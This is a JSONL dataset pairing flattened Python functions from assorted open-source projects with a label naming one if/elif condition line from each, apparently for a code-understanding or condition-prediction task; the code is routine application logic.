{"input": "def __init__(self, *args, **kwargs): \"\"\"Initialize the texture.\"\"\" super().__init__(*args, **kwargs) assert_empty_kwargs(**kwargs) if len(args) == 1: if isinstance(args[0], vtk.vtkTexture): self._from_texture(args[0]) elif isinstance(args[0], np.ndarray): self._from_array(args[0]) elif isinstance(args[0], vtk.vtkImageData): self._from_image_data(args[0]) elif isinstance(args[0], str): self._from_file(filename=args[0]) else: raise TypeError(f\"Table unable to be made from ({type(args[0])})\")", "label": "elif isinstance ( args [ 0 ] , str ) :"}
{"input": "def get_manifest_data(manifestpath): \"\"\"Reads a manifest file, returns a dictionary-like object.\"\"\" plist = {} try: plist = FoundationPlist.readPlist(manifestpath) except FoundationPlist.NSPropertyListSerializationException: display.display_error(u\"Could not read plist: %s\", manifestpath) if os.path.exists(manifestpath): try: os.unlink(manifestpath) except OSError as err: display.display_error(u\"Failed to delete plist: %s\", err) else: display.display_error(\"plist does not exist.\") return plist", "label": "if os . path . exists ( manifestpath ) :"}
{"input": "def _get_proxy(self): url_dissected = url_dissector.findall(self.session[\"proxy\"]) if url_dissected and len(url_dissected[0]) == 3: protocol, host, port = url_dissected[0] if protocol == \"socks5\": return (socks.PROXY_TYPE_SOCKS5, host, int(port)) if protocol == \"socks4\": return (socks.PROXY_TYPE_SOCKS4, host, int(port)) if protocol.startswith(\"http\"): return (socks.PROXY_TYPE_HTTP, host, int(port)) return None, None, None", "label": "if protocol == \"socks5\" :"}
{"input": "def nud(self): self.first = [] comma = False if self.token.id != \")\": while 1: if self.token.id == \")\": break self.first.append(self.expression()) if self.token.id == \",\": comma = True self.advance(\",\") else: break self.advance(\")\") if not self.first or comma: return self # tuple else: return self.first[0]", "label": "if self . token . id == \",\" :"}
{"input": "def _debug_log(self, text, level): if text and \"log\" in self.config.sys.debug: if not text.startswith(self.log_prefix): text = \"%slog(%s): %s\" % (self.log_prefix, level, text) if self.log_parent is not None: return self.log_parent.log(level, text) else: self.term.write(self._fmt_log(text, level=level))", "label": "if self . log_parent is not None :"}
{"input": "def remove_checker(self, namespace, checker): for c in pyomo.core.check.ModelCheckRunner._checkers(all=True): if c._checkerName() == checker: if namespace.checkers.get(c._checkerPackage(), None) is not None: for i in range( namespace.checkers[c._checkerPackage()].count(c._checkerName()) ): namespace.checkers[c._checkerPackage()].remove(c._checkerName())", "label": "if namespace . checkers . get ( c . _checkerPackage ( ) , None ) is not None :"}
{"input": "def check_if_role_exists(self, role_name, parsed_globals): parameters = {\"RoleName\": role_name} try: self._call_iam_operation(\"GetRole\", parameters, parsed_globals) except botocore.exceptions.ClientError as e: role_not_found_code = \"NoSuchEntity\" error_code = e.response.get(\"Error\", {}).get(\"Code\", \"\") if role_not_found_code == error_code: # No role error. return False else: # Some other error. raise. raise e return True", "label": "if role_not_found_code == error_code :"}
{"input": "def GetClipboardText(): text = \"\" if OpenClipboard(0): hClipMem = GetClipboardData(CF_TEXT) if hClipMem: GlobalLock.restype = c_char_p text = GlobalLock(hClipMem) GlobalUnlock(hClipMem) CloseClipboard() return ensure_unicode(text)", "label": "if hClipMem :"}
{"input": "def test_log_action_class(): v = Mock() for k, v in amo.LOG_BY_ID.items(): if v.action_class is not None: cls = \"action-\" + v.action_class else: cls = \"\" assert render(\"{{ log_action_class(id) }}\", {\"id\": v.id}) == cls", "label": "if v . action_class is not None :"}
{"input": "def _get_distinct_albumartists(config, session, web_client, query): logger.debug(f\"Getting distinct albumartists: {query}\") if query: search_result = _get_search(config, session, web_client, query, album=True) return { artist.name for album in search_result.albums for artist in album.artists if album.artists } else: return { track.album.artist.name for track in _get_playlist_tracks(config, session) if track.album and track.album.artist }", "label": "if track . album and track . album . artist"}
{"input": "def _get_commands(): proc = Popen([\"react-native\", \"--help\"], stdout=PIPE) should_yield = False for line in proc.stdout.readlines(): line = line.decode().strip() if not line: continue if \"Commands:\" in line: should_yield = True continue if should_yield: yield line.split(\" \")[0]", "label": "if \"Commands:\" in line :"}
{"input": "def __call__(self, job): import tensorboard_logger as tl # id = job.id budget = job.kwargs[\"budget\"] # config = job.kwargs['config'] timestamps = job.timestamps result = job.result exception = job.exception time_step = int(timestamps[\"finished\"] - self.start_time) if result is not None: tl.log_value(\"BOHB/all_results\", result[\"loss\"] * -1, time_step) if result[\"loss\"] < self.incumbent: self.incumbent = result[\"loss\"] tl.log_value(\"BOHB/incumbent_results\", self.incumbent * -1, time_step)", "label": "if result [ \"loss\" ] < self . incumbent :"}
{"input": "def _parse_yum_or_zypper_repositories(output): repos = [] current_repo = {} for line in output: line = line.strip() if not line or line.startswith(\"#\"): continue if line.startswith(\"[\"): if current_repo: repos.append(current_repo) current_repo = {} current_repo[\"name\"] = line[1:-1] if current_repo and \"=\" in line: key, value = line.split(\"=\", 1) current_repo[key] = value if current_repo: repos.append(current_repo) return repos", "label": "if current_repo :"}
{"input": "def selector(): while True: rlist, _, _ = select([proc.stdout, proc.stderr], [], [], line_timeout) if not rlist and line_timeout: raise ProcessLineTimedOut( \"popen line timeout expired\", getattr(proc, \"argv\", None), getattr(proc, \"machine\", None), ) for stream in rlist: yield (stream is proc.stderr), decode(stream.readline(linesize))", "label": "if not rlist and line_timeout :"}
{"input": "def getBranchFromFile(): global _gitdir branch = None if _gitdir: headFile = os.path.join(_gitdir, \"HEAD\") if os.path.isfile(headFile): with open(headFile, \"r\", encoding=\"utf-8\") as f: line = f.readline() if line: if line.startswith(\"ref\"): branch = line.split(\"/\")[-1].strip() else: branch = \"HEAD\" return branch", "label": "if line . startswith ( \"ref\" ) :"}
{"input": "def handle(self, msg): self._mic.send(msg) for calculate_seed, make_delegate, dict in self._delegate_records: id = calculate_seed(msg) if id is None: continue elif isinstance(id, collections.Hashable): if id not in dict or not dict[id].is_alive(): d = make_delegate((self, msg, id)) d = self._ensure_startable(d) dict[id] = d dict[id].start() else: d = make_delegate((self, msg, id)) d = self._ensure_startable(d) d.start()", "label": "elif isinstance ( id , collections . Hashable ) :"}
{"input": "def _print_items(items, _filter=None): if _filter: print(\"Displaying items matching filter: %s\" % _filter) print() for item in items: filtered_out = False for f in _filter.split(): if f.lower() not in item.lower(): filtered_out = True if not filtered_out: print(item) print()", "label": "if f . lower ( ) not in item . lower ( ) :"}
{"input": "def _cbAllRecords(self, results): ans, auth, add = [], [], [] for res in results: if res[0]: ans.extend(res[1][0]) auth.extend(res[1][1]) add.extend(res[1][2]) return ans, auth, add", "label": "if res [ 0 ] :"}
{"input": "def __status_update(self): was_active = False while True: if self.analytics_instance.active: was_active = True msg = \"Active (%s)\" % self.analytics_instance.progress self.broadcast(msg, \"analytics\", \"analyticsUpdate\") if was_active and not self.analytics_instance.active: self.broadcast(\"Inactive\", \"analytics\", \"analyticsUpdate\") was_active = False time.sleep(0.2)", "label": "if was_active and not self . analytics_instance . active :"}
{"input": "def plugin_song(self, song): for tag in [\"album\"]: values = filter(None, map(album_to_sort, song.list(tag))) if values and (tag + \"sort\") not in song: song[tag + \"sort\"] = \"\\n\".join(values) for tag in [\"artist\", \"albumartist\", \"performer\"]: values = filter(None, map(artist_to_sort, song.list(tag))) if values and (tag + \"sort\") not in song: song[tag + \"sort\"] = \"\\n\".join(values)", "label": "if values and ( tag + \"sort\" ) not in song :"}
{"input": "def update(h, s): with lock: try: i, c = find_cell(h) except KeyError: return if not c.frozen and c.content != s: c.content = parse(s) render_from(i, clear_after=True)", "label": "if not c . frozen and c . content != s :"}
{"input": "def get_parameters(self, names, with_decryption): result = [] if len(names) > 10: raise ValidationException( \"1 validation error detected: \" \"Value '[{}]' at 'names' failed to satisfy constraint: \" \"Member must have length less than or equal to 10.\".format(\", \".join(names)) ) for name in names: if name in self._parameters: result.append(self.get_parameter(name, with_decryption)) return result", "label": "if name in self . _parameters :"}
{"input": "def entered_file_action(self, path): attempt_copy = True path = self.try_append_extension(path) directory = os.path.dirname(path) if not os.path.exists(directory): try: self.create_folder(directory) except OSError as e: attempt_copy = False sublime.error_message( \"Cannot create '\" + path + \"'.\" + \" See console for details\" ) print(\"Exception: %s '%s'\" % (e.strerror, e.filename)) if attempt_copy: copy_success, new_file = self._copy_file(path) if copy_success: self.open_file(new_file)", "label": "if copy_success :"}
{"input": "def acquire(self): \"Acquire semaphore by decrementing value using spin-lock algorithm.\" while True: with self._cache.transact(retry=True): value = self._cache.get(self._key, default=self._value) if value > 0: self._cache.set( self._key, value - 1, expire=self._expire, tag=self._tag, ) return time.sleep(0.001)", "label": "if value > 0 :"}
{"input": "def commit(self): doc = {} for field, default in self.fields.iteritems(): if hasattr(self, field): value = getattr(self, field) if field in self.commit_fields or value != default: doc[field] = getattr(self, field) with open(self.path, \"w\") as settings_file: settings_file.write(json.dumps(doc, indent=4))", "label": "if hasattr ( self , field ) :"}
{"input": "def parse_entrypoints(self, content: str, root=None) -> RootDependency: if root is None: root = RootDependency() entrypoints = [] group = \"console_scripts\" for line in content.split(\"\\n\"): line = line.strip() if not line or line[0] in \"#;\": # ignore comments continue if line[0] == \"[\" and line[-1] == \"]\": group = line[1:-1] else: entrypoints.append(EntryPoint.parse(text=line, group=group)) root.entrypoints = tuple(entrypoints) return root", "label": "if not line or line [ 0 ] in \"#;\" :"}
{"input": "def request_with_retries(endpoint, timeout=30): start = time.time() while True: try: return requests.get(\"http://127.0.0.1:8000\" + endpoint, timeout=timeout) except requests.RequestException: if time.time() - start > timeout: raise TimeoutError time.sleep(0.1)", "label": "if time . time ( ) - start > timeout :"}
{"input": "def get_expression(self): \"\"\"Return the expression as a printable string.\"\"\" l = [] for c in self.content: if c.op is not None: # only applies to first cell l.append(c.op) if c.child is not None: l.append(\"(\" + c.child.get_expression() + \")\") else: l.append(\"%d\" % c.get_value()) return \"\".join(l)", "label": "if c . op is not None :"}
{"input": "def nrgen_asc(self): # compute the number of generations present for generation in range(self.generations_asc - 1, 0, -1): for p in range(len(self.data[generation])): (person, parents, child, userdata) = self.data[generation][p] if person: return generation return 1", "label": "if person :"}
{"input": "def check_all_verified(self): if not self.all_verified: new_all_verified = not self.lines.filter(verified=False).exists() if new_all_verified: self.all_verified = True if self.require_verification: self.add_log_entry( _(\"All rows requiring verification have been verified.\") ) self.require_verification = False self.save() return self.all_verified", "label": "if self . require_verification :"}
{"input": "def sort(self, cmp=None, key=None, reverse=False): \"Standard list sort method\" if key: temp = [(key(v), v) for v in self] temp.sort(key=lambda x: x[0], reverse=reverse) self[:] = [v[1] for v in temp] else: temp = list(self) if cmp is not None: temp.sort(cmp=cmp, reverse=reverse) else: temp.sort(reverse=reverse) self[:] = temp", "label": "if cmp is not None :"}
{"input": "def process_formdata(self, valuelist): if valuelist: date_str = \" \".join(valuelist) if not date_str: self.data = None raise ValidationError(self.gettext(\"Please input a date/time value\")) parse_kwargs = self.parse_kwargs.copy() if \"default\" not in parse_kwargs: try: parse_kwargs[\"default\"] = self.default() except TypeError: parse_kwargs[\"default\"] = self.default try: self.data = parser.parse(date_str, **parse_kwargs) except ValueError: self.data = None raise ValidationError(self.gettext(\"Invalid date/time input\"))", "label": "if \"default\" not in parse_kwargs :"}
{"input": "def _expand_dim_shape_func(data_shape, ndim, axis, num_newaxis): out = output_tensor((ndim + num_newaxis,), \"int64\") for i in const_range(out.shape[0]): if i < axis: out[i] = data_shape[i] elif i < axis + num_newaxis: out[i] = int64(1) else: out[i] = data_shape[i - num_newaxis] return out", "label": "elif i < axis + num_newaxis :"}
{"input": "def _Return(self, t): self._fill(\"return \") if t.value: if isinstance(t.value, Tuple): text = \", \".join([name.name for name in t.value.asList()]) self._write(text) else: self._dispatch(t.value) if not self._do_indent: self._write(\"; \")", "label": "if not self . _do_indent :"}
{"input": "def blas_header_version(): # Version for the base header version = (9,) if detect_macos_sdot_bug(): if detect_macos_sdot_bug.fix_works: # Version with fix version += (1,) else: # Version with error version += (2,) return version", "label": "if detect_macos_sdot_bug . fix_works :"}
{"input": "def get_queues(self, region: str, attribute_names: []): sqs_client = AWSFacadeUtils.get_client(\"sqs\", self.session, region) try: raw_queues = await run_concurrently(sqs_client.list_queues) except Exception as e: print_exception(f\"Failed to list SQS queues: {e}\") return [] else: if \"QueueUrls\" not in raw_queues: return [] queue_urls = raw_queues[\"QueueUrls\"] return await map_concurrently( self._get_queue_attributes, queue_urls, region=region, attribute_names=attribute_names, )", "label": "if \"QueueUrls\" not in raw_queues :"}
{"input": "def popupFrameXdiff(job, frame1, frame2, frame3=None): \"\"\"Opens a frame xdiff.\"\"\" for command in [\"/usr/bin/xxdiff\", \"/usr/local/bin/xdiff\"]: if os.path.isfile(command): for frame in [frame1, frame2, frame3]: if frame: command += \" --title1 %s %s\" % ( frame.data.name, getFrameLogFile(job, frame), ) shellOut(command)", "label": "if frame :"}
{"input": "def wrap(*args, **kwargs): callargs = getcallargs(fun, *args, **kwargs) if callargs[\"sock\"] is None: # This variable is used only to debug leak in tests COUNT[\"count\"] += 1 with IPSet() as sock: callargs[\"sock\"] = sock # We must pop kwargs here, else the function will receive # a dict of dict if \"kwargs\" in callargs: callargs.update(callargs.pop(\"kwargs\")) return fun(**callargs) # pylint:disable=star-args return fun(*args, **kwargs)", "label": "if \"kwargs\" in callargs :"}
{"input": "def set_multi(self, value): del self[atype] for addr in value: # Support assigning dictionary versions of addresses # instead of full Address objects. if not isinstance(addr, Address): if atype != \"all\": addr[\"type\"] = atype elif \"atype\" in addr and \"type\" not in addr: addr[\"type\"] = addr[\"atype\"] addrObj = Address() addrObj.values = addr addr = addrObj self.append(addr)", "label": "if atype != \"all\" :"}
{"input": "def test_connection(self, data=None, raise_alert=False): try: result = self._test_connection(self.connection_config(data)) except CallError as e: result = {\"error\": True, \"exception\": str(e)} if result[\"error\"]: if raise_alert: config = self.middleware.call_sync(\"kmip.config\") self.middleware.call_sync( \"alert.oneshot_create\", \"KMIPConnectionFailed\", {\"server\": config[\"server\"], \"error\": result[\"exception\"]}, ) return False else: return True", "label": "if raise_alert :"}
{"input": "def test05_geometries(self): \"Testing Geometries from Data Source Features.\" for source in ds_list: ds = DataSource(source.ds) # Incrementing through each layer and feature. for layer in ds: for feat in layer: g = feat.geom # Making sure we get the right Geometry name & type self.assertEqual(source.geom, g.geom_name) self.assertEqual(source.gtype, g.geom_type) # Making sure the SpatialReference is as expected. if hasattr(source, \"srs_wkt\"): self.assertEqual(source.srs_wkt, g.srs.wkt)", "label": "if hasattr ( source , \"srs_wkt\" ) :"}
{"input": "def __walk_dir_tree(self, dirname): dir_list = [] self.__logger.debug(\"__walk_dir_tree. START dir=%s\", dirname) for f in os.listdir(dirname): current = os.path.join(dirname, f) if os.path.isfile(current) and f.endswith(\"py\"): if self.module_registrant: self._load_py_from_file(current) dir_list.append(current) elif os.path.isdir(current): ret = self.__walk_dir_tree(current) if ret: dir_list.append((f, ret)) return dir_list", "label": "if self . module_registrant :"}
{"input": "def setData(self, data=None): # update the data for the grid for nRow in range(self.nRows): for nCol in range(self.nCols): if data is not None and nRow < data.shape[0] and nCol < data.shape[1]: self.SetCellValue(nRow, nCol, \"%f\" % data[nRow, nCol]) else: self.SetCellValue(nRow, nCol, \"0.000\") self.AutoSize()", "label": "if data is not None and nRow < data . shape [ 0 ] and nCol < data . shape [ 1 ] :"}
{"input": "def __init__(self, *args, **kwargs): \"\"\"Initialize the texture.\"\"\" super().__init__(*args, **kwargs) assert_empty_kwargs(**kwargs) if len(args) == 1: if isinstance(args[0], vtk.vtkTexture): self._from_texture(args[0]) elif isinstance(args[0], np.ndarray): self._from_array(args[0]) elif isinstance(args[0], vtk.vtkImageData): self._from_image_data(args[0]) elif isinstance(args[0], str): self._from_file(filename=args[0]) else: raise TypeError(f\"Table unable to be made from ({type(args[0])})\")", "label": "elif isinstance ( args [ 0 ] , vtk . vtkImageData ) :"}
{"input": "def delete_old_post_save( sender, instance, raw, created, update_fields, using, **kwargs ): \"\"\"Post_save on all models with file fields, deletes old files\"\"\" if raw or created: return for field_name, new_file in cache.fields_for_model_instance(instance): if update_fields is None or field_name in update_fields: old_file = cache.get_field_attr(instance, field_name) if old_file != new_file: delete_file(instance, field_name, old_file, using) # reset cache cache.make_cleanup_cache(instance)", "label": "if update_fields is None or field_name in update_fields :"}
{"input": "def do_refresh(self): try: if self.isVisible(): service_status = agent_status() self.properties.service_status_label.setText( HUMAN_SERVICE_STATUS[service_status] ) finally: QTimer.singleShot(REFRESH_PERIOD, self.do_refresh)", "label": "if self . isVisible ( ) :"}
{"input": "def json_dumps(data): \"\"\"Return data in nicely formatted json.\"\"\" try: return json.dumps( data, indent=1, sort_keys=True, separators=(\",\", \": \"), default=json_serialize_default, ) except UnicodeDecodeError: if sys.version_info[:2] == (2, 7): data = json_preserialize_binary(data) return json.dumps(data) raise", "label": "if sys . version_info [ : 2 ] == ( 2 , 7 ) :"}
{"input": "def __init__(self, aList): for element in aList: if len(element) > 0: if element.tag == element[0].tag: self.append(ListParser(element)) else: self.append(DictParser(element)) elif element.text: text = element.text.strip() if text: self.append(text)", "label": "if text :"}
{"input": "def __init__(self, token): self._convert_to_ascii = False self._find = None if token.search is None: return flags = 0 self._match_this_many = 1 if token.options: if \"g\" in token.options: self._match_this_many = 0 if \"i\" in token.options: flags |= re.IGNORECASE if \"a\" in token.options: self._convert_to_ascii = True self._find = re.compile(token.search, flags | re.DOTALL) self._replace = _CleverReplace(token.replace)", "label": "if \"a\" in token . options :"}
{"input": "def get_next(self): if self.current > self.maximum: raise StopIteration else: if self.width: payl = \"%0\" + str(self.width) + \"d\" payl = payl % (self.current) else: payl = str(self.current) self.current += 1 return payl", "label": "if self . width :"}
{"input": "def any(self, provider_name): result = authomatic.login(Webapp2Adapter(self), provider_name) if result: apis = [] if result.user: result.user.update() if result.user.credentials: apis = config.config.get(provider_name, {}).get(\"_apis\", {}) nice_provider_name = ( config.config.get(provider_name, {}).get(\"_name\") or provider_name.capitalize() ) render( self, result, result.popup_js(custom=dict(apis=apis, provider_name=nice_provider_name)), )", "label": "if result . user :"}
{"input": "def _get_lun_id(self, volume, target_name): \"\"\"Get lun id of the voluem in a target.\"\"\" pool = volume_utils.extract_host(volume.host, level=\"pool\") volume_name = self._trans_name_down(volume.name) lun_id = None luns = self._get_lun_list(target_name) for lun in luns: mappinglvm = lun.get(\"mappingLvm\") lun_name = mappinglvm.replace(r\"%s/\" % pool, \"\") if lun_name == volume_name: lun_id = lun.get(\"id\") return lun_id", "label": "if lun_name == volume_name :"}
{"input": "def save_settings(self, settings): for setting in self.settings: setting_obj = settings[setting] new_value = self.cleaned_data.get(setting) if setting_obj.python_type == \"image\": if new_value and new_value != self.initial.get(setting): self.save_image(setting_obj, new_value) elif self.cleaned_data.get(\"%s_delete\" % setting): self.delete_image(setting_obj) else: self.save_setting(setting_obj, new_value)", "label": "if setting_obj . python_type == \"image\" :"}
{"input": "def setup_with_driver(self): if not self.__class__.shared_state_initialized: try: self.setup_shared_state() self.logout_if_needed() except Exception: self.__class__.shared_state_in_error = True raise finally: self.__class__.shared_state_initialized = True else: if self.__class__.shared_state_in_error: raise unittest.SkipTest( \"Skipping test, failed to initialize state previously.\" )", "label": "if self . __class__ . shared_state_in_error :"}
{"input": "def _get_replication_type_param(k, v): words = v.split() if len(words) == 2 and words[0] == \"<in>\": REPLICA_SYNC_TYPES = { \"sync\": constants.REPLICA_SYNC_MODEL, \"async\": constants.REPLICA_ASYNC_MODEL, } sync_type = words[1].lower() if sync_type in REPLICA_SYNC_TYPES: return REPLICA_SYNC_TYPES[sync_type] msg = _( \"replication_type spec must be specified as \" \"replication_type='<in> sync' or '<in> async'.\" ) LOG.error(msg) raise exception.InvalidInput(reason=msg)", "label": "if sync_type in REPLICA_SYNC_TYPES :"}
{"input": "def request(self, host, handler, request_body, verbose=False): # retry request once if cached connection has gone cold for i in (0, 1): try: return self.single_request(host, handler, request_body, verbose) except socket.error as e: if i or e.errno not in (errno.ECONNRESET, errno.ECONNABORTED, errno.EPIPE): raise except http_client.BadStatusLine: # close after we sent request if i: raise", "label": "if i :"}
{"input": "def make_sales_return_records(): if random.random() < 0.1: for data in frappe.get_all( \"Delivery Note\", fields=[\"name\"], filters={\"docstatus\": 1} ): if random.random() < 0.1: try: dn = make_sales_return(data.name) dn.insert() dn.submit() frappe.db.commit() except Exception: frappe.db.rollback()", "label": "if random . random ( ) < 0.1 :"}
{"input": "def getStatusString(self): if not self._isAvailable: return \"Doodle3D box not found\" if self._printing: if self._blockIndex < len(self._fileBlocks): ret = \"Sending GCode: %.1f%%\" % ( float(self._blockIndex) * 100.0 / float(len(self._fileBlocks)) ) elif len(self._fileBlocks) > 0: ret = \"Finished sending GCode to Doodle3D box.\" else: ret = \"Different print still running...\" # ret += \"\\nErrorCount: %d\" % (self._errorCount) return ret return \"Printer found, waiting for print command.\"", "label": "if self . _blockIndex < len ( self . _fileBlocks ) :"}
{"input": "def coro(*args, **kw): res = func(*args, **kw) if isinstance(res, futures.Future) or inspect.isgenerator(res): res = yield from res elif _AwaitableABC is not None: # If 'func' returns an Awaitable (new in 3.5) we # want to run it. try: await_meth = res.__await__ except AttributeError: pass else: if isinstance(res, _AwaitableABC): res = yield from await_meth() return res", "label": "if isinstance ( res , _AwaitableABC ) :"}
{"input": "def _skip_to_next_iteration_group(self): while True: if self._currkey is self._marker: pass elif self._tgtkey is self._marker: break else: if not self._tgtkey == self._currkey: break newvalue = next(self._iterator) if self._keyfunc is None: newkey = newvalue else: newkey = self._keyfunc(newvalue) self._currkey = newkey self._currvalue = newvalue", "label": "if not self . _tgtkey == self . _currkey :"}
{"input": "def in_quadview(context): for area in context.window.screen.areas: if area.type != \"VIEW_3D\": continue for space in area.spaces: if space.type != \"VIEW_3D\": continue if len(space.region_quadviews) > 0: return True return False", "label": "if area . type != \"VIEW_3D\" :"}
{"input": "def find_from_pythonpath(name): for dirpath in sys.path: if not os.path.isdir(dirpath): continue path = os.path.join(dirpath, name) if os.path.isfile(path): return path return None", "label": "if not os . path . isdir ( dirpath ) :"}
{"input": "def detailed_exceptions_wrapper(self, *args, **kwargs): try: return meth(self, *args, **kwargs) except ScriptError as e: info = e.args[0] if not isinstance(info, dict): raise info.setdefault(\"type\", ScriptError.SPLASH_LUA_ERROR) info.setdefault(\"splash_method\", _name) raise e", "label": "if not isinstance ( info , dict ) :"}
{"input": "def metadata(draft): test_metadata = {} json_schema = create_jsonschema_from_metaschema(draft.registration_schema.schema) for key, value in json_schema[\"properties\"].items(): response = \"Test response\" items = value[\"properties\"][\"value\"].get(\"items\") enum = value[\"properties\"][\"value\"].get(\"enum\") if items: # multiselect response = [items[\"enum\"][0]] elif enum: # singleselect response = enum[0] elif value[\"properties\"][\"value\"].get(\"properties\"): response = {\"question\": {\"value\": \"Test Response\"}} test_metadata[key] = {\"value\": response} return test_metadata", "label": "elif value [ \"properties\" ] [ \"value\" ] . get ( \"properties\" ) :"}
{"input": "def separate_keys(self, keys, torrent_ids): \"\"\"Separates the input keys into torrent class keys and plugins keys\"\"\" if self.torrents: for torrent_id in torrent_ids: if torrent_id in self.torrents: status_keys = list(self.torrents[torrent_id].status_funcs) leftover_keys = list(set(keys) - set(status_keys)) torrent_keys = list(set(keys) - set(leftover_keys)) return torrent_keys, leftover_keys return [], []", "label": "if torrent_id in self . torrents :"}
{"input": "def upgrade(): bind = op.get_bind() op.add_column(\"slices\", sa.Column(\"datasource_id\", sa.Integer())) session = db.Session(bind=bind) for slc in session.query(Slice).all(): if slc.druid_datasource_id: slc.datasource_id = slc.druid_datasource_id if slc.table_id: slc.datasource_id = slc.table_id session.merge(slc) session.commit() session.close()", "label": "if slc . table_id :"}
{"input": "def __call__(self, controller, environ, context): context.session = session = SessionObject(environ, **self.options) environ[\"beaker.session\"] = session environ[\"beaker.get_session\"] = self._get_session if \"paste.testing_variables\" in environ: environ[\"paste.testing_variables\"][\"session\"] = session response = self.next_handler(controller, environ, context) if session.accessed(): session.persist() session_headers = session.__dict__[\"_headers\"] if session_headers[\"set_cookie\"]: cookie = session_headers[\"cookie_out\"] if cookie: response.headers.extend(((\"Set-cookie\", cookie),)) return response", "label": "if cookie :"}
{"input": "def propagate(self, user, change_action=None, author=None): \"\"\"Propagate current translation to all others.\"\"\" result = False for unit in self.same_source_units: if not user.has_perm(\"unit.edit\", unit): continue if unit.target == self.target and unit.state == self.state: continue unit.target = self.target unit.state = self.state unit.save_backend( user, False, change_action=change_action, author=None, run_checks=False, ) result = True return result", "label": "if not user . has_perm ( \"unit.edit\" , unit ) :"}
{"input": "def load_model(self, model_dict): model_param = None model_meta = None for _, value in model_dict[\"model\"].items(): for model in value: if model.endswith(\"Meta\"): model_meta = value[model] if model.endswith(\"Param\"): model_param = value[model] LOGGER.info(\"load model\") self.set_model_meta(model_meta) self.set_model_param(model_param) self.phi = np.array([model_param.phi_a])", "label": "if model . endswith ( \"Meta\" ) :"}
{"input": "def name(self): \"\"\"Get the enumeration name of this storage class.\"\"\" if self._name_map is None: self._name_map = {} for key, value in StorageClass.__dict__.items(): if isinstance(value, StorageClass): self._name_map[value] = key return self._name_map[self]", "label": "if isinstance ( value , StorageClass ) :"}
{"input": "def relro(self): try: gnu_relro = lief.ELF.SEGMENT_TYPES.GNU_RELRO flags = lief.ELF.DYNAMIC_TAGS.FLAGS bind_now = lief.ELF.DYNAMIC_FLAGS.BIND_NOW if self.elf.get(gnu_relro): if bind_now in self.elf.get(flags): return \"Full RELRO\" else: return \"Partial RELRO\" return \"No RELRO\" except lief.not_found: return \"No RELRO\"", "label": "if bind_now in self . elf . get ( flags ) :"}
{"input": "def test_counter_instantiation(self): self.assertIs(type(typing_extensions.Counter()), collections.Counter) self.assertIs(type(typing_extensions.Counter[T]()), collections.Counter) self.assertIs(type(typing_extensions.Counter[int]()), collections.Counter) class C(typing_extensions.Counter[T]): ... if TYPING_3_5_3: self.assertIs(type(C[int]()), C) if not PEP_560: self.assertEqual(C.__bases__, (typing_extensions.Counter,)) else: self.assertEqual(C.__bases__, (collections.Counter, typing.Generic))", "label": "if not PEP_560 :"}
{"input": "def handle_exception(self, e, result): for k in sorted(result.thrift_spec): if result.thrift_spec[k][1] == \"success\": continue _, exc_name, exc_cls, _ = result.thrift_spec[k] if isinstance(e, exc_cls): setattr(result, exc_name, e) return True return False", "label": "if result . thrift_spec [ k ] [ 1 ] == \"success\" :"}
{"input": "def find_from_pythonpath(name): for dirpath in sys.path: if not os.path.isdir(dirpath): continue path = os.path.join(dirpath, name) if os.path.isfile(path): return path return None", "label": "if os . path . isfile ( path ) :"}
{"input": "def parse_location(srclocation): loc = symbols.Location( get_value(srclocation, \"file\"), get_value(srclocation, \"project\") ) if loc.is_null(): loc = symbols.InstalledLocation( symbols.parse_package(get_value(srclocation, \"package\")), parse_package_db(get_value(srclocation, \"db\")), ) if loc.is_null(): loc = symbols.OtherLocation(get_value(srclocation, \"source\")) return loc if not loc.is_null() else None", "label": "if loc . is_null ( ) :"}
{"input": "def execute(self): logger.debug(f\"host {self.host} try ports: {default_ports}\") for single_port in default_ports: if self.test_connection(self.host, single_port): logger.debug(f\"Reachable port found: {single_port}\") self.publish_event(OpenPortEvent(port=single_port))", "label": "if self . test_connection ( self . host , single_port ) :"}
{"input": "def get_dynamic_incoming_outgoing_rate(self, sle): # Get updated incoming/outgoing rate from transaction if sle.recalculate_rate: rate = self.get_incoming_outgoing_rate_from_transaction(sle) if flt(sle.actual_qty) >= 0: sle.incoming_rate = rate else: sle.outgoing_rate = rate", "label": "if flt ( sle . actual_qty ) >= 0 :"}
{"input": "def _naf(mult): \"\"\"Calculate non-adjacent form of number.\"\"\" ret = [] while mult: if mult % 2: nd = mult % 4 if nd >= 2: nd = nd - 4 ret += [nd] mult -= nd else: ret += [0] mult //= 2 return ret", "label": "if mult % 2 :"}
{"input": "def indent_xml(elem, level=0): \"\"\"Do our pretty printing and make Matt very happy.\"\"\" i = \"\\n\" + level * \" \" if elem: if not elem.text or not elem.text.strip(): elem.text = i + \" \" if not elem.tail or not elem.tail.strip(): elem.tail = i for elem in elem: indent_xml(elem, level + 1) if not elem.tail or not elem.tail.strip(): elem.tail = i else: if level and (not elem.tail or not elem.tail.strip()): elem.tail = i", "label": "if not elem . text or not elem . text . strip ( ) :"}
{"input": "def clockface(radius): reset() pensize(7) for i in range(60): jump(radius) if i % 5 == 0: fd(25) jump(-radius - 25) else: dot(3) jump(-radius) rt(6)", "label": "if i % 5 == 0 :"}
{"input": "def OnTextEntered(self, evt): text = self.GetValue() if self.doSearch(text): self.searches.append(text) if len(self.searches) > self.maxSearches: del self.searches[0] self.SetMenu(self.MakeMenu()) self.SetValue(\"\")", "label": "if len ( self . searches ) > self . maxSearches :"}
{"input": "def wrapped_send(bot, location, content=None, preprocessor=None, **kwargs): try: if preprocessor is not None: content = await preprocessor(bot, location, content) await location.send(content, **kwargs) except Exception as _exc: main_log.error( \"I could not send an owner notification to %s (%s)\", location, location.id, exc_info=_exc, )", "label": "if preprocessor is not None :"}
{"input": "def explode(self, obj): \"\"\"Determine if the object should be exploded.\"\"\" if obj in self._done: return False result = False for item in self._explode: if hasattr(item, \"_moId\"): # If it has a _moId it is an instance if obj._moId == item._moId: result = True else: # If it does not have a _moId it is a template if obj.__class__.__name__ == item.__name__: result = True if result: self._done.add(obj) return result", "label": "if hasattr ( item , \"_moId\" ) :"}
{"input": "def _verify_treestore(itr, tree_values): i = 0 while itr: values = tree_values[i] if treestore[itr][0] != values[0]: return False if treestore.iter_children(itr): if not _verify_treestore(treestore.iter_children(itr), values[1]): return False itr = treestore.iter_next(itr) i += 1 return True", "label": "if treestore . iter_children ( itr ) :"}
